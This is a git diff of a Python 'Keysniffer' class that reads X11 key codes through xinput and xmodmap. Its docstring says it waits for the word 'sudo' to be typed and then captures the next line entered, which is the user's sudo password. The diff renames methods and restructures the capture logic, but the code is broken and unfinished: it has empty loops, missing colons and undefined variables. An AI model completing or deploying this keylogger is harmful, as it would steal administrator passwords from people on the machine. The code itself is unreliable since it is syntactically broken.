@@ -8,8 +8,12 @@ class Keysniffer():
                self.xinput = xinput_bin
                self.keycodes = {}
                self.outfile = outfile
-                
-        def GetKeyCodes(self):
+               self.keyboard = self.getKeyboardID()
+        
+        def getKeyboardID(self):
+                pass
+
+        def getKeyCodes(self):
                 """
                 Get keycode mapping using xmodmap and use codes as keys in a dict.
                 """
@@ -40,7 +44,7 @@ class Keysniffer():
                                         self.keycodes[str(c1)] = names
 
 
-        def CodeConverter(self, codes):
+        def codeConverter(self, codes):
                 """
                 Convert given list of keycodes to their respective values.
                 """
@@ -52,15 +56,18 @@ class Keysniffer():
 
                 
 
-        def Sniff(self):
+        def keySniff(self):
                 """
                 Execute xinput to begin sniffing keycodes, search for 'sudo' key 
                 combination and then capture the input the comes after the next press 
                 of 'Enter' up to the next time 'Enter' is pressed.
                 """
-                keystream = subprocess.Popen((self.xinput), stdout=subprocess.PIPE, 
-                        universal_newlines=True)
 
+                # Call xinput to start sniffing keycodes and pipe its output 
+                keystream = subprocess.Popen((self.xinput, ), stdout=subprocess.PIPE, 
+                        universal_newlines=True)
+                
+                # Create a list to hold keycodes, fill it with 4 keycodes at a time
                 code_buf = []
                 while len(code_buf) > 5:
                         for line in keystream.stdout:
@@ -70,22 +77,20 @@ class Keysniffer():
                                 else:
                                         continue
                 
-                sudo = str('sudo').split
-                search_str = []
-                for char in sudo:
-                        search_str.append('(' + char + ')')
-                search_codes = []
+                # Break the string we will be searching for into its individual keycodes
+                def string_to_keycodes(self, search_str):
+                        split_str = str(search_str).split
+                        search_str = []
+                        for char in sudo:
+                                search_str.append('(' + char + ')')
+                        search_codes = []
 
-                for item in self.keycodes.keys()
-                        reverse_keys = {}
+                        for item in self.keycodes.keys()
+                                reverse_keys = {}
 
 
-                for item in search_str:
-                        
-                        
+                        for item in search_str:
 
-                
-                for code in code_buf:
 
 
         
